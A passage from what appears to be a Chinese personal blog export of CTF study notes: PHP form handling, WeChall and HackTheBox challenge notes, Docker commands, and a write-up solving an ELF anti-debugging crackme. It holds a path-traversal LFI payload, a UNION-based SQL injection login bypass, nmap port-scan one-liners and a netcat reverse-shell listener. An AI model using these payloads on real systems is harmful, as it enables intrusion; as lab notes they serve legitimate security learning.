<h5 id="使用POST方法从表单发送的信息对于其他人是不可见的-（所有名称-值都嵌入在HTTP请求的正文中），并且对要发送的信息量没有限制。"><a href="#使用POST方法从表单发送的信息对于其他人是不可见的-（所有名称-值都嵌入在HTTP请求的正文中），并且对要发送的信息量没有限制。" class="headerlink" title="使用POST方法从表单发送的信息对于其他人是不可见的 （所有名称/值都嵌入在HTTP请求的正文中），并且对要发送的信息量没有限制。"></a>使用POST方法从表单发送的信息对于其他人是不可见的 （所有名称/值都嵌入在HTTP请求的正文中），并且对要发送的信息量没有限制。</h5><p>此外，POST支持高级功能，例如在将文件上传到服务器时支持多部分二进制输入。<br>但是，由于变量未显示在URL中，因此无法为页面添加书签。</p>
<h5 id="SERVER-“-PHP-SELF”-将提交的表单数据发送到页面本身，而不是跳转到另一个页面。这样，用户将在与表单相同的页面上收到错误消息。"><a href="#SERVER-“-PHP-SELF”-将提交的表单数据发送到页面本身，而不是跳转到另一个页面。这样，用户将在与表单相同的页面上收到错误消息。" class="headerlink" title="$ _ SERVER [“ PHP_SELF”]将提交的表单数据发送到页面本身，而不是跳转到另一个页面。这样，用户将在与表单相同的页面上收到错误消息。"></a>$ _ SERVER [“ PHP_SELF”]将提交的表单数据发送到页面本身，而不是跳转到另一个页面。这样，用户将在与表单相同的页面上收到错误消息。</h5><p>htmlspecialchars（）函数将特殊字符转换为HTML实体。这意味着它将用＆lt;替换&lt;和&gt;之类的HTML字符。和＆gt;。这样可以防止攻击者通过以表格形式注入HTML或Javascript代码（跨站点脚本攻击）来利用代码。</p>
<h5 id="从用户输入数据中删除不必要的字符（多余的空格，制表符，换行符）（使用PHP-trim（）函数）"><a href="#从用户输入数据中删除不必要的字符（多余的空格，制表符，换行符）（使用PHP-trim（）函数）" class="headerlink" title="从用户输入数据中删除不必要的字符（多余的空格，制表符，换行符）（使用PHP trim（）函数）"></a>从用户输入数据中删除不必要的字符（多余的空格，制表符，换行符）（使用PHP trim（）函数）</h5><h5 id="从用户输入数据中删除反斜杠（-）（使用PHP-stripslashes（）函数）"><a href="#从用户输入数据中删除反斜杠（-）（使用PHP-stripslashes（）函数）" class="headerlink" title="从用户输入数据中删除反斜杠（\）（使用PHP stripslashes（）函数）"></a>从用户输入数据中删除反斜杠（\）（使用PHP stripslashes（）函数）</h5><p>使用PHP empty() 函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;&lt;?php echo htmlspecialchars(<span class="subst">$_SERVER</span>[&quot;</span>PHP_SELF<span class="string">&quot;]);?&gt;&quot;</span>&gt;</span><br><span class="line">Name: &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span>&gt;</span><br><span class="line">&lt;span class=&quot;error&quot;&gt;* &lt;?php echo $nameErr;?&gt;&lt;/span&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">E-mail:</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;email&quot;</span>&gt;</span><br><span class="line">&lt;span class=&quot;error&quot;&gt;* &lt;?php echo $emailErr;?&gt;&lt;/span&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Website:</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;website&quot;</span>&gt;</span><br><span class="line">&lt;span class=&quot;error&quot;&gt;&lt;?php echo $websiteErr;?&gt;&lt;/span&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Comment: &lt;textarea name=<span class="string">&quot;comment&quot;</span> rows=<span class="string">&quot;5&quot;</span> cols=<span class="string">&quot;40&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>preg_match（）函数在字符串中搜索模式，如果存在模式，则返回true，否则返回false。<br>正则表达式</p>
<p>include和require语句相同，但失败时除外：<br>require 将产生致命错误（E_COMPILE_ERROR）并停止脚本</p>
<h5 id="include-只会产生警告（E-WARNING）并且脚本将继续"><a href="#include-只会产生警告（E-WARNING）并且脚本将继续" class="headerlink" title="include 只会产生警告（E_WARNING）并且脚本将继续"></a>include 只会产生警告（E_WARNING）并且脚本将继续</h5><p>该readfile()函数读取文件并将其写入输出缓冲区。</p>
<?php
$myfile = fopen("webdictionary.txt", "r") or die("Unable to open file!");
echo fread($myfile,filesize("webdictionary.txt"));
fclose($myfile);
?>

<p>该fclose()功能用于关闭打开的文件。<br>结束所有文件后，关闭所有文件是一种良好的编程习惯。您不希望在服务器上到处运行打开的文件占用资源！</p>
<p>该feof()功能检查是否已达到“文件结尾”（EOF）。</p>
<p>该fopen()函数还用于创建文件。可能有些混乱，但是在PHP中，使用与打开文件相同的功能创建文件。</p>
<p>$filename = ‘pages/‘.(isset($_GET[“file”])$_GET[“file”]:”welcome”).’.html’;</p>
<p>？ ：</p>
<h5 id="isset（）函数检查是否设置了变量，这意味着必须声明该变量并且该变量不能为NULL。"><a href="#isset（）函数检查是否设置了变量，这意味着必须声明该变量并且该变量不能为NULL。" class="headerlink" title="isset（）函数检查是否设置了变量，这意味着必须声明该变量并且该变量不能为NULL。"></a>isset（）函数检查是否设置了变量，这意味着必须声明该变量并且该变量不能为NULL。</h5><p>die（）函数是exit（）函数的别名。</p>
<h5 id="eval（）函数将字符串评估为PHP代码。"><a href="#eval（）函数将字符串评估为PHP代码。" class="headerlink" title="eval（）函数将字符串评估为PHP代码。"></a>eval（）函数将字符串评估为PHP代码。</h5><h5 id="dirname（）函数返回父目录的路径。"><a href="#dirname（）函数返回父目录的路径。" class="headerlink" title="dirname（）函数返回父目录的路径。"></a>dirname（）函数返回父目录的路径。</h5><h5 id="in-array（）函数在数组中搜索特定值。"><a href="#in-array（）函数在数组中搜索特定值。" class="headerlink" title="in_array（）函数在数组中搜索特定值。"></a>in_array（）函数在数组中搜索特定值。</h5><p>注意：如果搜索参数是字符串，并且类型参数设置为TRUE，则搜索区分大小写。</p>
<h3 id="WECHALL-LFI"><a href="#WECHALL-LFI" class="headerlink" title="WECHALL LFI"></a>WECHALL LFI</h3><p>?file=page/jhkd.html<br>?file=../../solution.php%00<br>%00 后的字符不算，已经更改<br>../ 遍历目录</p>
<p>switch ($which)<br>        {<br>        case 0:<br>        case 1:<br>        case 2:<br>                require_once $which.’.php’;<br>                break;<br>        default:<br>                echo GWF_HTML::error(‘PHP-0817’, ‘Hacker NoNoNo!’, false);<br>                break;<br>        }<br>which=0,1,2 都执行require_once</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF入门 WECALL2-正则</title>
    <url>/2020/07/06/CTF%E5%85%A5%E9%97%A8%20WECALL2/</url>
    <content><![CDATA[<p>python3<br>list()   一个字符字符分</p>
<hr>
<p>child[a],child[b] = child[b],child[a]</p>
<h5 id="交换位置"><a href="#交换位置" class="headerlink" title="交换位置"></a>交换位置</h5><a id="more"></a>
<hr>
<p>spilt() 按空格分<br>int()</p>
<hr>
<h3 id="Training-Crypto-Substitution-I"><a href="#Training-Crypto-Substitution-I" class="headerlink" title="Training: Crypto - Substitution I"></a>Training: Crypto - Substitution I</h3><p><a href="http://practicalcryptography.com/cryptanalysis/text-characterisation/quadgrams/">http://practicalcryptography.com/cryptanalysis/text-characterisation/quadgrams/</a></p>
<h3 id="Training-Crypto-Caesar-II"><a href="#Training-Crypto-Caesar-II" class="headerlink" title="Training: Crypto - Caesar II"></a>Training: Crypto - Caesar II</h3><p>import sys<br>sys.stdout = open(‘/root/Documents/CTF_WECALL/results.py’, mode = ‘w’,encoding=’utf-8’)</p>
<p>打印到文件中</p>
<p>line breaks. 换行符</p>
<p>vscode python 整段右移 选中tab</p>
<hr>
<h3 id="python-2-转到-3"><a href="#python-2-转到-3" class="headerlink" title="python 2 转到 3"></a>python 2 转到 3</h3><p>2to3.py</p>
<hr>
<h3 id="正则30分钟学习"><a href="#正则30分钟学习" class="headerlink" title="正则30分钟学习"></a>正则30分钟学习</h3><p><a href="https://deerchao.cn/tutorials/regex/regex.htm">https://deerchao.cn/tutorials/regex/regex.htm</a></p>
<h3 id="wechall-mysql-2"><a href="#wechall-mysql-2" class="headerlink" title="wechall mysql 2"></a>wechall mysql 2</h3><p>‘ union select 1,’admin’ ,md5(‘1’)  from users where username =’admin’#</p>
<p><code>？？可以随便选择</code></p>
<h3 id="wechall-WWW-Basics"><a href="#wechall-WWW-Basics" class="headerlink" title="wechall WWW-Basics"></a>wechall WWW-Basics</h3><p>lsof -i:端口号 用于查看某一端口的占用情况，比如查看8000端口使用情况，lsof -i:8000</p>
<p>nginx -s quit<br>ps -ax | grep nginx<br>lsof -i:80<br>ip add</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF入门 WECALL4+hackthebox-REVERSE</title>
    <url>/2020/07/11/CTF%E5%85%A5%E9%97%A8%20WECALL4+hackthebox-REVERSE/</url>
    <content><![CDATA[<h4 id="wechall-register-globals"><a href="#wechall-register-globals" class="headerlink" title="wechall register_globals"></a>wechall register_globals</h4><p>register_globals 在php 5.4.0 后被移除 其会自动生成各种变量 如html请求变量<br><a href="http://1.1.1.1/report.asp?id=123&amp;kehu=222">http://1.1.1.1/report.asp?id=123&amp;kehu=222</a><br>login[0]=admin 直接login=admin 只取第一第二个字符</p>
<hr>
<h4 id="hackthebox"><a href="#hackthebox" class="headerlink" title="hackthebox"></a>hackthebox</h4><p>invite challenge 浏览器console 下运行函数 加（）<br>curl -X POST https://…</p>
<a id="more"></a>
<hr>
<h4 id="hackthebox-–-Enumeration"><a href="#hackthebox-–-Enumeration" class="headerlink" title="hackthebox – Enumeration"></a>hackthebox – Enumeration</h4><p>ports=$(nmap -p- –min-rate=1000 -T4 10.10.10.27 | grep ^[0-9] | cut -d ‘/‘ -f 1 | tr ‘\n’ ‘,’ | sed s/,$//)<br>nmap -sC -sV -p$ports 10.10.10.27</p>
<p>command 1 | command 2 把第一个命令command 1执行的结果作为command 2的输入传给command 2<br>-T4 可以加快执行速度<br>-p- 扫描所有端口<br>-min-rate 1000 to request that Nmap send at least 1,000 packets per secondcut<br>cut Print selected parts of lines from each FILE to standard output.<br>-f 指定第一列 -d 指定列分隔符<br> tr 命令用于转换或删除文件中的字符 ‘\n’ 转换为‘，’<br>sed ‘s/regexp/replacement/flags’.<br>Its basic concept is simple: the s command attempts to match the pattern space against the supplied regular expression regexp; if the match is successful, then that portion of the pattern space which was matched is replaced with replacement.<br>regexp匹配成功后用replace替代</p>
<p>select IS_SRVROLEMEMBER (‘sysadmin’)</p>
<hr>
<p>remote code execution (RCE)</p>
<h4 id="A-reverse-shell"><a href="#A-reverse-shell" class="headerlink" title="A reverse shell"></a>A reverse shell</h4><p>is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener port on which it receives the connection, which by using, code or command execution is achieved.</p>
<h4 id="Bind-shell"><a href="#Bind-shell" class="headerlink" title="Bind shell"></a>Bind shell</h4><p>Bind shell is a type of shell in which the target machine opens up a communication port or a listener on the victim machine and waits for an incoming connection. The attacker then connects to the victim machine’s listener which then leads to code or command execution on the server.</p>
<hr>
<p>netcat<br>nc -lvnp 443 监听模式 443 外来请求</p>
<hr>
<h4 id="ollydbg"><a href="#ollydbg" class="headerlink" title="ollydbg"></a>ollydbg</h4><p>显示当前EIP *<br>执行到光标位置 F4<br>F2 断点<br>CALL 把接下来的地址先压入栈<br>win 压入参数逆序 f(a,b) 先压b 后 a<br>test = and 不改变操作数值</p>
<h4 id="x64dbg"><a href="#x64dbg" class="headerlink" title="x64dbg"></a>x64dbg</h4><p>file test.py</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker学习笔记</title>
    <url>/2019/03/15/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>sudo add-apt-repository <br>   “deb [arch=amd64] <a href="https://download.docker.com/linux/ubuntu">https://download.docker.com/linux/ubuntu</a> <br>   $(lsb_release -cs) <br>   stable”</p>
<p><a href="https://download.docker.com/linux/ubuntu/dists/bionic/pool/stable/amd64/">https://download.docker.com/linux/ubuntu/dists/bionic/pool/stable/amd64/</a></p>
<a id="more"></a>

<p>配置完镜像源后，记得重启</p>
<p>/bin/sh<br>/bin/bash<br>运行shell</p>
<p>docker run –name mysql-data -p 3306:3306 -v /home/finsenty/Documents/mysqldata:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=”123456” -d mysql:5.7</p>
<p>docker run -p 8888:5000 –name myfirstapp YOUR_USERNAME/myfirstapp</p>
<ul>
<li>Running on <a href="http://0.0.0.0:5000/">http://0.0.0.0:5000/</a> (Press CTRL+C to quit)</li>
</ul>
<p> docker rm <code>docker ps -a -q</code></p>
<p> docker rmi <code>docker images -q</code></p>
<p> docker run -p 4000:80 –name py-http6 –link mariadb:mysql finsenty/http5</p>
<p> mysql.connecter 查询后面带一个，</p>
<p> -u “<a href="http://192.168.160.1/sqltest/post.php&quot;">http://192.168.160.1/sqltest/post.php&quot;</a> –forms</p>
<p> docker run -d -p 4000:80 –link mysql:mysql –name http6 finsenty/http5</p>
<p>docker build -t finsenty/http5 .</p>
]]></content>
  </entry>
  <entry>
    <title>ELF x64 - Nanomites - Introduction_WP</title>
    <url>/2020/10/31/ELF%20x64%20-%20Nanomites%20-%20Introduction_WP/</url>
    <content><![CDATA[<h2 id="ELF-x64-Nanomites-Introduction-WP"><a href="#ELF-x64-Nanomites-Introduction-WP" class="headerlink" title="ELF x64 - Nanomites - Introduction_WP"></a>ELF x64 - Nanomites - Introduction_WP</h2><p>这是运用了<code>Debug Blocker</code>技术的题目<br>又花了些时间，终于破解了</p>
<h3 id="gdb-设置跟踪父进程还是子进程"><a href="#gdb-设置跟踪父进程还是子进程" class="headerlink" title="gdb  设置跟踪父进程还是子进程"></a>gdb  设置跟踪父进程还是子进程</h3><p><code>set follow-fork-mode parrent|child</code><br>当发生fork时，指示调试器执行父进程还是子进程</p>
<h3 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h3><p>在程序执行到<code>int3</code>时，就会触发 <code>SIGTRAP </code>信号，</p>
<a id="more"></a>
<pre><code> long ptrace(enum __ptrace_request request,
             pid_t pid,
             void *addr,
             void *data);</code></pre>
<p>参数data：作用则根据request的不同而变化，如果需要向目标进程中写入数据，data存放的是需要写入的数据；如果从目标进程中读数据，data将存放返回的数据</p>
<h3 id="strace"><a href="#strace" class="headerlink" title="strace"></a>strace</h3><p>可以先用strace来观察在系统调用<br><code>strace -i ./ch28.bin</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[00007fa5f9b6bf4e] <span class="built_in">read</span>(0, toto  /输入值</span><br><span class="line"><span class="string">&quot;toto\n&quot;</span>, 1024) = 5</span><br><span class="line">[00007fa5f9b75c22] mmap(NULL, 321, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fa5f9c8e000</span><br><span class="line">[00007fa5f9b4857b] <span class="built_in">clone</span>(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7fa5f9c43810) = 131358</span><br><span class="line">[00007fa5f9b48286] wait4(131358, [&#123;WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP&#125;], 0, NULL) = 131358</span><br><span class="line">[00007fa5f9b48286] --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=131358, si_uid=1000, si_status=SIGTRAP, si_utime=0, si_stime=0&#125; ---</span><br><span class="line">[00007fa5f9b7329a] ptrace(PTRACE_GETREGS, 131358, NULL, 0x7fff0dde4900) = 0</span><br><span class="line">[00007fa5f9b7329a] ptrace(PTRACE_SETREGS, 131358, NULL, 0x7fff0dde4900) = 0</span><br><span class="line">[00007fa5f9b7329a] ptrace(PTRACE_CONT, 131358, NULL, 0) = 0</span><br><span class="line">[00007fa5f9b48286] wait4(131358, [&#123;WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP&#125;], 0, NULL) = 131358</span><br><span class="line">[00007fa5f9b48286] --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=131358, si_uid=1000, si_status=SIGTRAP, si_utime=0, si_stime=0&#125; ---</span><br><span class="line">[00007fa5f9b7329a] ptrace(PTRACE_GETREGS, 131358, NULL, 0x7fff0dde4900) = 0</span><br><span class="line">[00007fa5f9b7329a] ptrace(PTRACE_SETREGS, 131358, NULL, 0x7fff0dde4900) = 0</span><br><span class="line">[00007fa5f9b7329a] ptrace(PTRACE_CONT, 131358, NULL, 0) = 0</span><br><span class="line">[00007fa5f9b48286] wait4(131358, [&#123;WIFEXITED(s) &amp;&amp; WEXITSTATUS(s) == 1&#125;], 0, NULL) = 131358</span><br><span class="line">[00007fa5f9b48286] --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=131358, si_uid=1000, si_status=1, si_utime=0, si_stime=0&#125; ---</span><br><span class="line">[00007fa5f9b48286] wait4(131358, 0x7fff0dde4a1c, 0, NULL) = -1 ECHILD (No child processes)</span><br><span class="line">[00007fa5f9b6bff3] write(1, <span class="string">&quot;Wrong! try hard! :)\n&quot;</span>, 20Wrong! try hard! :)</span><br><span class="line">) = 20</span><br><span class="line">[00007fa5f9b6c087] lseek(0, -1, SEEK_CUR) = -1 ESPIPE (Illegal seek)</span><br><span class="line">[00007fa5f9b48759] exit_group(0)        = ?</span><br><span class="line">[????????????????] +++ exited with 0 +++</span><br></pre></td></tr></table></figure>
<p>当我输入值‘toto’，触发了两次 SIGTRAP，之后退出</p>
<h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><p>直接IDA PRO反编译<br>其他的细节都不管，就看我们需要的</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_400871</span><span class="params">(__int64 input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> stat_loc; <span class="comment">// [rsp+1Ch] [rbp-F4h]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+F8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">__pid_t</span> pid; <span class="comment">// [rsp+104h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *dest; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  stat_loc = <span class="number">0</span>;</span><br><span class="line">  dest = mmap(<span class="number">0L</span>L, <span class="number">0x141</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L);   <span class="comment">// 0x7ffff7ffb000</span></span><br><span class="line">  <span class="built_in">memcpy</span>(dest, src, <span class="number">0x8D</span>uLL);                   <span class="comment">// src == 0x601080 指向400ac0( 0x48</span></span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span> ( !pid )                                   <span class="comment">// 子进程</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ptrace(<span class="number">0</span>, <span class="number">0L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L) == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;So you want to trace me?!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">42</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = dest;</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(__int64))dest)(input);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( waitpid(pid, &amp;stat_loc, <span class="number">0</span>) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)stat_loc == <span class="number">127</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( BYTE1(stat_loc) == <span class="number">5</span> )               <span class="comment">// 0x57f &gt;&gt;8 =0x5</span></span><br><span class="line">        sub_400736((__int64)dest, pid);</span><br><span class="line">      ptrace(PTRACE_CONT, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)pid, <span class="number">0L</span>L, <span class="number">0L</span>L);  <span class="comment">//表示继续执行子进程</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( BYTE1(stat_loc) )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Wrong! try hard! :)&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;POOOOOOOOOOOOOOOOOOOOOOOOO God damn!! You won!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>子进程会执行 memcpy()h函数复制到<code>dest</code>的代码，<code>src == 0x601080</code> 指向<code>400ac0</code>，所以实际复制的是<code>400ac0</code>处的指令。</p>
<p><a href="https://imgchr.com/i/BUFlQK"><img src="https://s1.ax1x.com/2020/10/31/BUFlQK.jpg" alt="BUFlQK.jpg"></a></p>
<p><code>RDI </code>保存着我们输入的数据，每次读取一个字节，存入<code>al</code>，之后<code>int3</code>,就会触发SIGTRAP，父进程进行调试子进程。</p>
<hr>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_400736</span><span class="params">(__int64 dest, <span class="keyword">unsigned</span> <span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+10h] [rbp-F0h] 0x7fffffffdc00 ==RAX 子进程寄存器值放在这里</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+60h] [rbp-A0h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+90h] [rbp-70h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+A0h] [rbp-60h] 0x400a30 有问题</span></span><br><span class="line">  __int64 dest_1; <span class="comment">// [rsp+F0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+F8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v9; <span class="comment">// [rsp+FFh] [rbp-1h]</span></span><br><span class="line">                                                <span class="comment">// 0x20cf9 子进程pid</span></span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  dest_1 = dest + <span class="number">1</span>;                            <span class="comment">// dest + 1</span></span><br><span class="line">  result = ptrace(PTRACE_GETREGS, pid, <span class="number">0L</span>L, &amp;v3);<span class="comment">// 获取值所有寄存器值？？</span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">12</span>; ++i )                   <span class="comment">// 13个int 3</span></span><br><span class="line">  &#123;                                             <span class="comment">// rbp-0x8 = i</span></span><br><span class="line">    result = seg_6010A0[<span class="number">3</span> * i];</span><br><span class="line">    <span class="keyword">if</span> ( v5 - dest_1 == result )                <span class="comment">// v5 = 0x7ffff7ffb00c </span></span><br><span class="line">                                                <span class="comment">// c-1 = b ==11</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v9++ + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v9 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( seg_6010A0[<span class="number">3</span> * i + <span class="number">1</span> + i % <span class="number">2</span>] == v4 )<span class="comment">// v4 == input 表示输入值放在子进程r9中  0x7fffffffdc50</span></span><br><span class="line">          v6 |= <span class="number">0x40</span>uLL;                        <span class="comment">// 修改了V6 0x7fffffffdc90 第十八个 表示EFLAGS</span></span><br><span class="line">                                                <span class="comment">// 之前 rax 处 程序 JE zf=0 才不跳转 如果跳转则程序结束</span></span><br><span class="line">        result = ptrace(PTRACE_SETREGS, pid, <span class="number">0L</span>L, &amp;v3);<span class="comment">// 设置值</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hummmmmmm NO WAY.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">42</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> <code>ptrace(PTRACE_GETREGS, pid, 0LL, &amp;v3)</code>获取所有子进程寄存器值，存放在V3地址处。</p>
<p><code> if ( seg_6010A0[3 * i + 1 + i % 2] == v4 )</code>// v4 == input 表示输入值放在子进程r9中  0x7fffffffdc50<br>这条语句就是我们需要的，其将我们的输入值与<code>6010A0</code>处的值进行比较，如果相等，则修改V6，也就是EFLAGS，<code>将ZF置1</code>，<code>JNE不跳转</code>，如果跳转了直接结束进程。</p>
<p><code>ptrace(PTRACE_SETREGS, pid, 0LL, &amp;v3)</code>将修改后的寄存器值重新赋给子进程</p>
<hr>
<p>从<code>if</code>知道，比较共进行13次，下面编写python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data=[]</span><br><span class="line">flag=[]</span><br><span class="line">print(<span class="string">&quot;give me a bottle of rum!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ch28.txt&#x27;</span>,<span class="string">&#x27;rt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span>(line.find(<span class="string">&#x27;db&#x27;</span>)!=<span class="number">-1</span>):</span><br><span class="line">            pos=line.find(<span class="string">&#x27;db&#x27;</span>)</span><br><span class="line">            item=line[pos+<span class="number">4</span>:pos+<span class="number">6</span>]</span><br><span class="line">            data.append(<span class="built_in">int</span>(item,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    print(<span class="built_in">format</span>(i,<span class="string">&#x27;x&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    flag.append(data[<span class="number">3</span>*i+<span class="number">1</span>+i%<span class="number">2</span>])</span><br><span class="line">print(<span class="string">&#x27;1111111111111111111111111111&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    print(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print()</span><br><span class="line">print(<span class="built_in">len</span>(flag))</span><br></pre></td></tr></table></figure>
<p>ch28.txt保存<code>6010A0</code>开始的数据。</p>
<p><a href="https://imgchr.com/i/BUkHu8"><img src="https://s1.ax1x.com/2020/10/31/BUkHu8.jpg" alt="BUkHu8.jpg"></a><br>运行得到flag</p>
<p>make -n 显示命令，但不执行</p>
<hr>
<h3 id="大佬代码"><a href="#大佬代码" class="headerlink" title="大佬代码"></a>大佬代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;start_with_anything&quot;</span></span><br><span class="line">gdb.execute(<span class="string">&#x27;file ./ch28.bin&#x27;</span>)</span><br><span class="line">gdb.execute(<span class="string">&#x27;set pagination off&#x27;</span>)</span><br><span class="line">gdb.execute(<span class="string">&#x27;br *0x40080d&#x27;</span>)</span><br><span class="line">gdb.execute(<span class="string">&#x27;run &lt;&lt;&lt; &#x27;</span>+password)</span><br><span class="line">rdx = gdb.execute(<span class="string">&#x27;info reg rdx&#x27;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">rdx = re.findall(<span class="string">&#x27;^rdx\s+\w+\s+(\d+)$&#x27;</span>, rdx)</span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;&quot;</span> + <span class="built_in">chr</span>( <span class="built_in">int</span>(rdx[<span class="number">0</span>]) )</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  gdb.execute(<span class="string">&#x27;run &lt;&lt;&lt; &#x27;</span>+password)</span><br><span class="line">  <span class="comment"># Continue to last character</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> password:</span><br><span class="line">    gdb.execute(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    rdx = gdb.execute(<span class="string">&#x27;info reg rdx&#x27;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">  <span class="keyword">except</span> gdb.error:</span><br><span class="line">    <span class="comment"># If info reg fails it is probably because the program has exited.</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  rdx = re.findall(<span class="string">&#x27;^rdx\s+\w+\s+(\d+)$&#x27;</span>, rdx)</span><br><span class="line">  